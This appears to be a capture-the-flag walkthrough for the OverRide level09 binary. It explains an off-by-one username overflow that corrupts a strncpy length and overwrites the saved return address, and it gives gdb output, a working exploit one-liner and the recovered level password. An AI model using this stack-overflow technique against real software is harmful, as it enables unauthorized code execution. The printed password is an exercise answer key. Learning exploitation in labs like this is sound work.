# Walkthrough level09

We try to run the program:  

```bash
level09@OverRide:~$ ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: name
>: Welcome, name
>: Msg @Unix-Dude
>>: message
>: Msg sent!
```

With the code we can see that we do a strncpy with a value contained in a variable.

```c
 strncpy(*buffer, msg, (int) *(*buffer + 180));
```

We must write a value at `*buffer + 180`. To do this, we can see that we can write 40 char. The difficulty is to identify that we can write 41 char instead of 40, because of `i must be <= 40`.
`buffer[40]` is the 41th char.  

```c
while (i <= 40 && username[i]) {
  (*buffer)[140 + i] = username[i];
  i++;
 }
```

Now we try to override the value at `buffer[180]`:

```bash
r < <(python -c 'print("a" * 41)'; python -c 'print("b" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1])')

--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------

Breakpoint 17, 0x000055555555491f in handle_msg ()
(gdb) x/xw $rbp-0xc
0x7fffffffe5c4: 0x00000061

```

We can see the value is `0x61` and we have write 97 char. (`0x61` = 97):  

```bash
(gdb) x/64xg $rbp-0xc0
0x7fffffffe510: 0x6262626262626262 0x6262626262626262
0x7fffffffe520: 0x6262626262626262 0x6262626262626262
0x7fffffffe530: 0x6262626262626262 0x6262626262626262
0x7fffffffe540: 0x6262626262626262 0x6262626262626262
0x7fffffffe550: 0x6262626262626262 0x6262626262626262
0x7fffffffe560: 0x6262626262626262 0x6262626262626262
0x7fffffffe570: 0x0000000000000062 0x0000555555554c10
```

So we want to override this variable to write on saved RIP. We search the offset.  

```bash
(gdb) i f
Stack level 0, frame at 0x7fffffffe5e0:
 rip = 0x555555554924 in handle_msg; saved rip 0x555555554abd
 called by frame at 0x7fffffffe5f0
 Arglist at 0x7fffffffe5d0, args: 
 Locals at 0x7fffffffe5d0, Previous frame's sp is 0x7fffffffe5e0
 Saved registers:
  rbp at 0x7fffffffe5d0, [rip at 0x7fffffffe5d8]

(gdb) p 0x7fffffffe5d8 - 0x7fffffffe510
$4 = 200
```

Lets exploit this:

```bash
level09@OverRide:~$ (python -c 'print("\xff" * 41)'; python -c 'print("b" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1])'; cat -) | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
level09@OverRide:~$ su end
Password: 

end@OverRide:~$ cat end 
GG !
```
